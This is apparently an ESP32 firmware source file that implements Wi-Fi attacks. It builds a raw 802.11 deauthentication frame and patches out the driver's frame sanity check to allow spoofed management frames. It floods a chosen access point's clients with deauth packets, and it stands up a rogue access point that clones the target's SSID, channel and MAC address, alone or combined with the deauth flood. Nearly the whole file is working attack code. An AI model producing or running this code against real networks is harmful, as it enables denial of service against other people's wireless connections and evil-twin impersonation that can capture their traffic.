#include "modules/wifi/wifi_attacks_module.h"
#include <string.h>
#include "drivers/wifi_driver.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"

static TaskHandle_t task_brod_attack = NULL;
static TaskHandle_t task_rogue_attack = NULL;

wifi_config_t rouge_config;

bool running_broadcast_attack = false;
int broadcast_attack_task_id = 0;

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation
 * https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

static void attack_brodcast_send_raw_frame(const uint8_t* frame_buffer,
                                           int size) {
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  if (err != ESP_OK) {
    ESP_LOGE(TAG_WIFI_ATTACK_MODULE, "Failed to send raw frame: %s",
             esp_err_to_name(err));
    running_broadcast_attack = false;
  }
}

void wifi_attack_brod_send_deauth_frame(wifi_ap_record_t* ap_target) {
  ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Starting broadcast attack: %s",
           ap_target->ssid);

  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  memcpy(&deauth_frame[10], ap_target->bssid, 6);
  memcpy(&deauth_frame[16], ap_target->bssid, 6);
  while (running_broadcast_attack) {
    attack_brodcast_send_raw_frame(deauth_frame, sizeof(deauth_frame));
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
  ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Broadcast attack stopped");
  vTaskSuspend(task_brod_attack);
}

void wifi_attack_rogueap(const wifi_ap_record_t* ap_record) {
  ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Configuring Rogue AP SSID: %s",
           ap_record->ssid);
  wifi_driver_set_ap_mac(&ap_record->bssid);
  wifi_config_t ap_config = {
      .ap = {.ssid_len = strlen((char*) ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .password = "dummypassword",
             .max_connection = 1},
  };
  mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);

  wifi_driver_ap_start(&ap_config);
  while (true) {
    vTaskDelay(10000 / portTICK_PERIOD_MS);
  }
  ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Rogue AP stopped");
  vTaskSuspend(task_rogue_attack);
}

void wifi_attacks_module_stop() {
  running_broadcast_attack = false;
  if (task_brod_attack != NULL) {
    vTaskDelete(task_brod_attack);
  }
  if (task_rogue_attack != NULL) {
    wifi_config_t default_ap = wifi_driver_access_point_begin();
    wifi_driver_restore_ap_mac();
    vTaskDelete(task_rogue_attack);
  }
}

void wifi_attack_handle_attacks(int attack_type, wifi_ap_record_t* ap_target) {
  running_broadcast_attack = true;
  switch (attack_type) {
    case WIFI_ATTACK_BROADCAST:
      ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Starting broadcast attack: %s",
               ap_target->ssid);
      xTaskCreate(wifi_attack_brod_send_deauth_frame,
                  "wifi_attack_brod_create_task", 4096, ap_target, 5,
                  &task_brod_attack);
      break;
    case WIFI_ATTACK_ROGUE_AP:
      ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Starting rogue attack: %s",
               ap_target->ssid);
      xTaskCreate(wifi_attack_rogueap, "wifi_attack_rogueap", 4096, ap_target,
                  5, &task_rogue_attack);
      break;
    case WIFI_ATTACK_COMBINE:
      ESP_LOGI(TAG_WIFI_ATTACK_MODULE, "Starting combined attack: %s",
               ap_target->ssid);
      xTaskCreate(wifi_attack_rogueap, "wifi_attack_rogueap", 4096, ap_target,
                  5, &task_rogue_attack);
      xTaskCreate(wifi_attack_brod_send_deauth_frame,
                  "wifi_attack_brod_create_task", 4096, ap_target, 5,
                  &task_brod_attack);
      break;
    default:
      break;
  }
}
